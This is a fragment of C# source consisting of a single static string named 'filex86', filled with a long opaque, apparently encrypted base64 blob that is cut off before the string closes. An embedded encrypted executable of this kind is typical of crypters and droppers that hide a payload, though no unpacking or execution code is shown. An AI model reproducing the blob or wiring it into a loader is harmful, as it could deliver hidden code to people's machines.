        public static string filex86 = @"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
